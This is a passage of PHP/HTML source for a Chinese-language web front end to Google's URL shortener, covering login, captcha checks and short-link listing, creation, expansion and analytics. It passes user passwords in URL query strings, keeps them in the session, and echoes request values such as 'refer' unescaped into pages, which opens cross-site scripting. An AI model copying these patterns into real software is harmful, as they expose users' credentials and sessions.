                        If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                                if (trim(request("checkcode")) != ""){
                                			if(!is_wap()){
                                        AlertBack("四位验证码错误！" , 1);
                                        break;
                                      }  
                                      else{
                                    	?>

<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>           

        <tr class="tdbg">
                <td align="center" id="result">
											四位验证码错误！
											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>返回</a>
                </td>
        </tr>  
</table> 
																			<?php 
                        break;
                                    }
                                }       
                                elseif (trim(request("checkcode")) == ""){
                                        AlertBack("四位验证码为空！" , 1);
                                        break;
                                }               
                        }
                        redirect(scriptpath()."?api=urlshortener&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim($_POST["uname"])))."&pwd=".encodeuri(Base64_encode(trim($_POST["pwd"])))."&action=".encodeuri(trim(request("action")))."&checkcode=".trim(request("checkcode"))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                        break;
                }
                $google_urlshortener = new google_class();
                if (trim(request('uname')) != "" && trim(request('pwd')) != "" && trim(request("authclientLogin")) == ""){
	               	$AuthClientLogin = $google_urlshortener->googleauthclientlogin(trim(request("uname")),trim(request("pwd")),trim(request('action')));
	                redirect(ScriptPath()."?api=urlshortener&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri("urlshortener.list")."&authclientLogin=".encodeuri(trim($AuthClientLogin))."&c=".encodeuri(trim(request("c")))."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t"))));
              	}	
              	elseif ($_SESSION["google"]["uname"] != "" && $_SESSION["google"]["pwd"] != "" && $_SESSION["google"]["authclientLogin"] != ""){
	               	$AuthClientLogin = $google_urlshortener->googleauthclientlogin(trim($_SESSION["google"]["uname"]),trim($_SESSION["google"]["pwd"]),trim(request('action')));
	                redirect(ScriptPath()."?api=urlshortener&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim($_SESSION["google"]["uname"]))."&pwd=".encodeuri(trim($_SESSION["google"]["pwd"]))."&skin=".$skincolor."&action=".encodeuri("urlshortener.list")."&authclientLogin=".encodeuri(trim($AuthClientLogin))."&c=".encodeuri(trim(request("c")))."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t"))));
              	}
                //echo $AuthClientLogin;
                break;

        case "urlshortener.list":
                if (trim(request("logout")) != ""){
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("google");
}
                        //$_SESSION["google"]=array('album' => array('uname' => '', 'pwd' => '', 'authclientLogin' => ''));                                     
                        //session_register("uname"); 
                        $_SESSION["google"]["uname"] = "";      
                        $_SESSION["google"]["pwd"] = "";        
                        $_SESSION["google"]["authclientLogin"] = "";    
                        //session_register("pwd"); 
                        //$_SESSION["pwd"] = "";        
                        //session_register("authclientLogin"); 
                        //$_SESSION["authclientLogin"] = "";    
                        redirect(scriptpath()."?api=urlshortener&skin=".$skincolor."&uname=&pwd=&action=".encodeuri(trim(request("action")))."&urlflag=1&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&authclientLogin=".encodeuri(trim(request("authclientLogin"))));
                        break;
                }
                elseif ($_SESSION["google"]["uname"] != "" && $_SESSION["google"]["pwd"] != "" && $_SESSION["google"]["authclientLogin"] != "" && trim(request("uname")) == "" && trim(request("pwd")) == "" && trim(request("authclientLogin")) == ""){
                        redirect(scriptpath()."?api=urlshortener&skin=".$skincolor."&uname=".encodeuri(trim($_SESSION["google"]["uname"]))."&pwd=".encodeuri(trim($_SESSION["google"]["pwd"]))."&action=".trim(request("action"))."&checkcode=".trim(request("checkcode"))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&authclientLogin=".encodeuri($_SESSION["google"]["authclientLogin"]));
                        break;
                }       
                elseif (trim(request('uname')) != "" && trim(request('pwd')) != ""){
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("google");
}
                        //$_SESSION["google"]=array('album' => array('uname' => trim(request("uname")), 'pwd' => trim(request("pwd")), 'authclientLogin' => trim(request("authclientLogin"))),'urlshortener' => array('uname' => trim(request("uname")), 'pwd' => trim(request("pwd")), 'authclientLogin' => trim(request("authclientLogin"))));                                        
                        $_SESSION["google"]["uname"] = trim(request("uname"));  
                        $_SESSION["google"]["pwd"] = trim(request("pwd"));      
                        $_SESSION["google"]["authclientLogin"] = trim(request("authclientLogin"));      
                        //session_register("uname"); 
                        //$_SESSION["uname"] = trim(request("uname"));  
                        //session_register("pwd"); 
                        //$_SESSION["pwd"] = trim(request("pwd"));      
                        //session_register("authclientLogin"); 
                        //$_SESSION["authclientLogin"] = trim(request("authclientLogin"));
                }       
                elseif (trim(request("uname")) == "" || trim(request("pwd")) == ""){
                        redirect(scriptpath()."?api=urlshortener&skin=".$skincolor."&uname=&pwd=&action=&checkcode=".trim(request("checkcode"))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&authclientLogin=".encodeuri(trim(request("authclientLogin"))));
                        break;
                }       
                elseif (trim(request("authclientLogin")) == "" || stripos(trim(request("authclientLogin")),"Bad")){
                        redirect(scriptpath()."?api=urlshortener&skin=".$skincolor."&uname=&pwd=&action="."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&authclientLogin=");
                        break;
                }
                $google_urlshortener = new google_class();
                $jsonstr = $google_urlshortener->googleurlshortenerlist(trim(request("authclientLogin")),$page,$pagesize);
                //print_r($jsonstr);
                $pagesize = $jsonstr['pagesize'];
                if ($jsonstr['totalitem'] > $pagesize) $strpagesize = $pagesize; else $strpagesize = $jsonstr['totalitem'];
                ?>
<script language="JavaScript" type="text/javascript">
function selitemall()
{
 i=<?php echo $strpagesize*($page-1);?>;
 while(eval('document.urlshortener.chidd'+i))
 {
  eval('document.urlshortener.chidd'+i).checked = document.urlshortener.allitem.checked;
  i++;
 }
}
function delitem()
{
 if(!confirm('确定删除选中的文件吗?')) return;
 document.urlshortener.action='<?php echo ScriptPath()."?api=urlshortener&action=".encodeuri("urlshortener.remove")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&delok=1';
 document.urlshortener.submit();
}
</script>       
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" colspan="3"> 查 询 结 果 : 共 <?php echo $jsonstr['totalitem'];?> 条 </td>
        </tr>
</table>
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left" colspan="3" width="100%"> [ <a style="color:#000000" href="<?php echo ScriptPath()."?api=urlshortener&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri(trim(request('action')))."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))."&authclientLogin=".trim(request("authclientLogin"))?>" target=_self>网址</a> - <?php echo Base64_decode(trim(request("uname")));?> <?php  if (trim($_SESSION["google"]["uname"]) != "" && trim($_SESSION["google"]["pwd"]) != "" && trim($_SESSION["google"]["authclientLogin"]) != "") {?> - <a style="color:#000000;"href="<?php echo scriptpath()."?api=urlshortener&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim(request("uname"))))."&pwd=".encodeuri(Base64_encode(trim(request("uname"))))."&action=".encodeuri(trim(request("action")))."&urlflag=1&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&logout=1&authclientLogin=".trim(request("authclientLogin"));?>" target="_self">退出</a><?php  } ?> ] </td>
        </tr>
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
<form name="urlshortener" method="post" action="">
                <?php 
                $totalitem = $jsonstr['totalitem'];
                if (fmod($totalitem, $pagesize) == 0){
                        $totalpage=$totalitem/$pagesize;
                }       
                else{
                        $totalpage=ceil($totalitem/$pagesize);
                }       
                if ($totalpage == $page)
                        $endid = $totalitem-1;
                elseif ($totalpage > $page)
                        $endid = floor($strpagesize*($page)-1);
                elseif ($totalpage < $page){
                        $endid = floor($strpagesize*($page-1)-1);
                }                       
                $endid = $endid - $pagesize * ($page-1);
                ?>
        <tr class="tdbg">
                <td align="center" width=4%>
                        <input type="checkbox" id="allitem" name="allitem" value="" onclick="javascript:selitemall();" />
                </td>   
                <td align="center" width=20%>
                        短网址
                </td>
                <td align="center" width=36%>
                        原网址
                </td>
                <td align="center" width=10%>
                        状态
                </td>
                <td align="center" width=15%>
                        时间
                </td>
                <td align="center" width=15%>
                        <a style="color:#000000" href="<?php echo ScriptPath();?>?api=urlshortener&action=<?php echo encodeuri("urlshortener.create");?>&skin=<?php echo $skincolor;?>&authclientLogin=<?php echo encodeuri(trim(request("authclientLogin")));?>&uname=<?php echo encodeuri(trim(request("uname")));?>&pwd=<?php echo encodeuri(trim(request("pwd")));?>">添加</a> <a style="color:#000000" href="<?php echo ScriptPath();?>?api=urlshortener&action=<?php echo encodeuri("urlshortener.expand");?>&skin=<?php echo $skincolor;?>&authclientLogin=<?php echo encodeuri(trim(request("authclientLogin")));?>&uname=<?php echo encodeuri(trim(request("uname")));?>&pwd=<?php echo encodeuri(trim(request("pwd")));?>">搜索</a>
                </td> 
        </tr>   
                <?php 
                for($i = 0;$i <= $endid;$i++){
                        //$objHdd = $objList->item($i);
                        ?>
        <tr class="tdbg">
                <td align="center">
                        <input type="checkbox" name="chidd<?php echo $i;?>" id="chidd<?php echo $i;?>" value="chidd<?php echo $i;?>" />
                </td>   
                <td align="center"%>
                        <?php 
                        $urlkind = $jsonstr['items'][$i]['urlkind'];
                        $urlid = $jsonstr['items'][$i]['urlshortlink'];
                        $urllongUrl = $jsonstr['items'][$i]['urllink'];
                        $urlstatus = $jsonstr['items'][$i]['urlstatus'];
                        $urlcreated = $jsonstr['items'][$i]['urlcreatedtime'];
                        echo "<a style=\"color:#000000\" href=\"".$urlid."\" target='_blank'>".$urlid."</a>";
                ?>
                </td>
                <td align="center">
                        <?php 
                        if(strlen($urllongUrl)<='60'){
       	                	echo "<a style=\"color:#000000\" href=\"".$urllongUrl."\" target='_blank'>".$urllongUrl."</a>";
               		}
               		else{
                       		echo "<a style=\"color:#000000\" href=\"".$urllongUrl."\" target='_blank'>".substr($urllongUrl,0,60).'...'."</a>";
               		}
                        ?>
                </td>
                <td align="center">
                        <?php echo $urlstatus?>
                </td>
                <td align="center">
                        <?php echo $urlcreated;?>
                </td>
                <td align="center">
                        <a style="color:#000000" href="<?php echo ScriptPath()."?api=urlshortener&action=".encodeuri("urlshortener.share")."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&urllink=".encodeuri($urlid)."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])?>">分享</a>
                        <a style="color:#000000" href="<?php echo ScriptPath()."?api=urlshortener&action=".encodeuri("urlshortener.study")."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&urllink=".encodeuri(Base64_encode($urlid))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])?>">分析</a>
                </td>
        </tr>   
                <?php 
                }
                ?>
                </td>
        </tr>
</table><table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg">
                <td align="center" colspan="3"> 共 <?php  echo $totalpage;?> 页 第  
                <?php 
                echo $page." 页 ".$sCrLf;
                if (floor($page)>1)
                        echo "<a style='color:#000000' href='".ScriptPath()."?api=urlshortener&action=".encodeuri(trim(request("action")))."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page-1)."&skin=".$skincolor."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))."'>上一页</a> ";
                if (floor($page)>0 && floor($page)<floor($totalpage))
                        echo "<a style='color:#000000' href='".ScriptPath()."?api=urlshortener&action=".encodeuri(trim(request("action")))."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page+1)."&skin=".$skincolor."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))."'>下一页</a> ";
                				?>
                				<input name="page" value="<?php  echo $page; ?>" style="height:20px;width:40px;font-size:11px;" <?php  $style->textarea("#FCFC9D",""); ?>>
												<input type="submit" class="button" name="gotopage" value=" Go ">                 
                				<?php 
                //$gotopage = New PageChange();
                //$gotopage->CallPageChange();
                ?>
                </td>
        </tr>   
</table>
<?php 
                //$gotopage->gotopage($totalpage,ScriptPath()."?api=urlshortener&action=".encodeuri(trim(request("action")))."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))."&gopage=ok&page=","X3193","请在空白处输入要转到的页数");
                break;
        case "urlshortener.create": // action - album.create start
  	  //echo trim(request("authclientLogin"));
 	  //echo httpPath()."?".$_SERVER['QUERY_STRING'];
                if (trim(request("authclientLogin")) == "" || stripos(trim(request("authclientLogin")),"Bad")){
                        //print_r(trim($_SERVER['QUERY_STRING']));
                        redirect(scriptpath()."?api=urlshortener&skin=".$skincolor."&uname=&pwd=&action=");
	                break;
                }                       
                if (trim(request("urllink")) == ""){
?>
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left" colspan="3" width="100%"> [ <a style="color:#000000" href="<?php echo ScriptPath()."?api=urlshortener&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri(trim('urlshortener.list'))."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))."&authclientLogin=".trim(request("authclientLogin"))?>" target=_self>网址</a> - <?php echo Base64_decode(trim(request("uname")));?> <?php  if (trim($_SESSION["google"]["uname"]) != "" && trim($_SESSION["google"]["pwd"]) != "" && trim($_SESSION["google"]["authclientLogin"]) != "") {?> - <a style="color:#000000;"href="<?php echo scriptpath()."?api=urlshortener&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim(request("uname"))))."&pwd=".encodeuri(Base64_encode(trim(request("uname"))))."&action=".encodeuri(trim('urlshortener.list'))."&urlflag=1&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&logout=1&authclientLogin=".trim(request("authclientLogin"));?>" target="_self">退出</a><?php  } ?> ] </td>
        </tr>
</table>

<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath()?>?api=checkcode&a=' + Math.random();
}
</script>               
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="35">
                <td align="center">
                        <form action="<?php echo ScriptPath()?>?api=urlshortener&action=<?php echo encodeuri('urlshortener.create');?>&pagesize=<?php  echo encodeuri($pagesize)."&skin=".$skincolor."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&page=".trim(request("page"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor?>" method="post" name="urlshortener">
                        &nbsp网址：<input type="text" class="text" name="urllink" value="" style="height:20px;width:40%;font-size:11px" <?php  $style->textarea("#FCFC9D","") ?>>  
                        &nbsp验证码：<input maxlength="4" <?php  $style->textarea("#FCFC9D","") ?> name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>   
        </tr>
</table>        
<?php       
                }
                else{
			if(trim($_POST["urllink"]) != ""){
		                If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                		        if (trim(request("checkcode")) != ""){
                                		AlertBack("四位验证码错误！" , 1);
                                		break;
                        		}       
	                        	elseif (trim(request("checkcode")) == ""){
        	                        	AlertBack("四位验证码为空！" , 1);
                	                	break;
                        		}               
                		}
                		redirect(ScriptPath()."?api=urlshortener&action=".encodeuri("urlshortener.create")."&skin=".$skincolor."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&urllink=".encodeuri(trim(request('urllink'))));
				break;
			}
			else{
		                $google_urlshortener = new google_class();
                		$urlcreate = $google_urlshortener->googleurlshortenercreate(trim(request("authclientLogin")),trim(request("urllink")));
		                $timeout = "5000";
		                //echo $timeout;
				//print_r($urlcreate);
		                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>           
                		<?php 
                		if ($urlcreate['errorinfo'] != '' && $urlcreate['urllink'] == '' && $urlcreate['urlshortlink'] == '' && $urlcreate['urlkind'] == ''){
                		?>
        <tr class="tdbg">
                <td align="center" id="result">
                        网址添加失败！原因：<?php echo $urlcreate['errorinfo']." <br>".($timeout/1000)?> 秒后返回上一页
                </td>
        </tr>   
                		<?php       
                        		echo "<p align=center><script>window.setTimeout(\"history.go(-2)\",".$timeout.");</script></p>";                                
                        		break;
                		}
                		elseif ($urlcreate['urllink'] != '' && $urlcreate['urlshortlink'] != '' && $urlcreate['urlkind'] != ''){
                		?>
        <tr class="tdbg">
                <td align="center" id="result">
                        网址添加成功！网址ID：<?php echo $urlcreate['urlshortlink']." <br>".($timeout/1000)?> 秒后返回上一页
                </td>
        </tr>   
                        		<?php       
                        		echo "<p align=center><script>window.setTimeout(\"history.go(-2)\",".$timeout.");</script></p>";                                
                
                		}       
                		?>
</table>                        
                		<?php               
			}                
                }
                break;
        case "urlshortener.expand": // action - album.create start
  		//echo trim(request("authclientLogin"));
                if (trim(request("authclientLogin")) == "" || stripos(trim(request("authclientLogin")),"Bad")){
                        //print_r(trim($_SERVER['QUERY_STRING']));
                        redirect(scriptpath()."?api=urlshortener&skin=".$skincolor."&uname=&pwd=&action=");
	                break;
                }   
                //echo httpPath()."?".$_SERVER['QUERY_STRING'];
                if (trim(request("urllink")) == ""){
?>
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left" colspan="3" width="100%"> [ <a style="color:#000000" href="<?php echo ScriptPath()."?api=urlshortener&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri(trim('urlshortener.list'))."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))."&authclientLogin=".trim(request("authclientLogin"))?>" target=_self>网址</a> - <?php echo Base64_decode(trim(request("uname")));?> <?php  if (trim($_SESSION["google"]["uname"]) != "" && trim($_SESSION["google"]["pwd"]) != "" && trim($_SESSION["google"]["authclientLogin"]) != "") {?> - <a style="color:#000000;"href="<?php echo scriptpath()."?api=urlshortener&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim(request("uname"))))."&pwd=".encodeuri(Base64_encode(trim(request("uname"))))."&action=".encodeuri(trim('urlshortener.list'))."&urlflag=1&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&logout=1&authclientLogin=".trim(request("authclientLogin"));?>" target="_self">退出</a><?php  } ?> ] </td>
        </tr>
</table>

<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath()?>?api=checkcode&a=' + Math.random();
}
</script>               
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="35">
                <td align="center">
                        <form action="<?php echo ScriptPath()?>?api=urlshortener&action=<?php echo encodeuri(trim(request("action")));?>&pagesize=<?php  echo encodeuri($pagesize)."&skin=".$skincolor."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&page=".trim(request("page"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor?>" method="post" name="google">
                        &nbsp短网址：<input type="text" class="text" name="urllink" value="" style="height:20px;width:30%;font-size:11px" <?php  $style->textarea("#FCFC9D","") ?>>  
                        &nbsp验证码：<input maxlength="4" <?php  $style->textarea("#FCFC9D","") ?> name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>   
        </tr>
</table>        
<?php       
                }
                else{
                	//echo trim(request("urllink"));
			if(trim($_POST["urllink"]) != ""){
		                If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                		        if (trim(request("checkcode")) != ""){
                                		AlertBack("四位验证码错误！" , 1);
                                		break;
                        		}       
	                        	elseif (trim(request("checkcode")) == ""){
        	                        	AlertBack("四位验证码为空！" , 1);
                	                	break;
                        		}               
                		}
				//ECHO encodeuri(trim(request('urllink')));
	                	redirect(ScriptPath()."?api=urlshortener&action=".encodeuri(trim(request("action")))."&skin=".$skincolor."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&urllink=".encodeuri(Base64_encode(trim(request("urllink")))));
				break;
			}
			else{
		                $google_urlshortener = new google_class();
                		$urlexpand = $google_urlshortener->googleurlshortenerexpand(trim(request("authclientLogin")),Base64_decode(trim(request("urllink"))));
		                $timeout = "5000";	
				//print_r($urlcreate);
				//break;
		                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>           
</table>                        
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left" colspan="3" width="100%"> [ <a style="color:#000000" href="<?php echo ScriptPath()."?api=urlshortener&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri("urlshortener.list")."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))."&authclientLogin=".trim(request("authclientLogin"))?>" target=_self>网址</a> - <?php echo Base64_decode(trim(request("uname")));?> <?php  if (trim($_SESSION["google"]["uname"]) != "" && trim($_SESSION["google"]["pwd"]) != "" && trim($_SESSION["google"]["authclientLogin"]) != "") {?> - <a style="color:#000000;"href="<?php echo scriptpath()."?api=urlshortener&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim(request("uname"))))."&pwd=".encodeuri(Base64_encode(trim(request("uname"))))."&action=".encodeuri(trim(request("action")))."&urlflag=1&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&logout=1&authclientLogin=".trim(request("authclientLogin"));?>" target="_self">退出</a><?php  } ?> ] </td>
        </tr>
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
                        	<?php 
                		if ($urlexpand['urllink'] == '' && $urlexpand['urlshortlink'] == '' && $urlexpand['urlkind'] == ''){
                		?>
        <tr class="tdbg">
                <td align="center" id="result">
                        网址查询失败！原因：<?php echo $urlcreate['errorinfo'];?>
                </td>
        </tr>   
                		<?php       
                        		//echo "<p align=center><script>window.setTimeout(\"history.go(-3)\",".$timeout.");</script></p>";                                
                        		break;
                		}
                		elseif ($urlexpand['urllink'] != '' && $urlexpand['urlshortlink'] != '' && $urlexpand['urlkind'] != ''){
                		?>	
        <tr class="tdbg">
                <td align="center" width=20%>
                        短网址
                </td>
                <td align="center" width=36%>
                        原网址
                </td>
                <td align="center" width=10%>
                        状态
                </td>
                <td align="center" width=15%>
                        <a style="color:#000000" href="<?php echo ScriptPath();?>?api=urlshortener&action=<?php echo encodeuri("urlshortener.create");?>&skin=<?php echo $skincolor;?>&authclientLogin=<?php echo encodeuri(trim(request("authclientLogin")));?>&uname=<?php echo encodeuri(trim(request("uname")));?>&pwd=<?php echo encodeuri(trim(request("pwd")));?>">添加</a> <a style="color:#000000" href="<?php echo ScriptPath();?>?api=urlshortener&action=<?php echo encodeuri("urlshortener.expand");?>&skin=<?php echo $skincolor;?>&authclientLogin=<?php echo encodeuri(trim(request("authclientLogin")));?>&uname=<?php echo encodeuri(trim(request("uname")));?>&pwd=<?php echo encodeuri(trim(request("pwd")));?>">搜索</a>
                </td> 
        </tr>   
        <tr class="tdbg">
                <td align="center">
				<?php 
		                        $urlkind = $urlexpand['urlkind'];
                		        $urlid = $urlexpand['urlshortlink'];
                        		$urllongUrl = $urlexpand['urllink'];
                        		$urlstatus = $urlexpand['urlstatus'];
                        		echo "<a style=\"color:#000000\" href=\"".$urlid."\" target='_blank'>".$urlid."</a>";
	             		?>
                </td>
                <td align="center">
                        	<?php 
                        		if(strlen($urllongUrl)<='60'){
                        			echo "<a style=\"color:#000000\" href=\"".$urllongUrl."\" target='_blank'>".$urllongUrl."</a>";
                			}
                			else{
                        			echo "<a style=\"color:#000000\" href=\"".substr($urllongUrl,0,60).'...'."\" target='_blank'>".substr($urllongUrl,0,60).'...'."</a>";
                			}
                        	?>
                </td>
                <td align="center">
                        	<?php echo $urlstatus?>
                </td>
                <td align="center">
                        分析 <a style="color:#000000" href="<?php echo ScriptPath()."?api=urlshortener&action=".encodeuri("urlshortener.share")."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&urllink=".encodeuri($urllink)."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>">分享</a>
                </td>
        </tr>   
                        		<?php       
                		}       
                		?>
</table>                        
                		<?php 
                	}	              
                }
                break;
        case "urlshortener.study": // action - album.create start
  		//echo trim(request("authclientLogin"));
                if (trim(request("authclientLogin")) == "" || stripos(trim(request("authclientLogin")),"Bad")){
                        //print_r(trim($_SERVER['QUERY_STRING']));
                        redirect(scriptpath()."?api=urlshortener&skin=".$skincolor."&uname=&pwd=&action=");
	                break;
                }                       
                //echo trim(request("urllink")).'k';
                if (trim(request("urllink")) != ""){
			if(trim($_POST["urllink"]) == ""){
		                $google_urlshortener = new google_class();
		                //echo trim(request("urllink")).'hhh';
                		$urlanalytics = $google_urlshortener->googleurlshorteneranalytics(trim(request("authclientLogin")),Base64_decode(trim(request("urllink"))));
		                $timeout = "5000";
		                //print_r($urlanalytics);
		                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>           
</table>                        
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
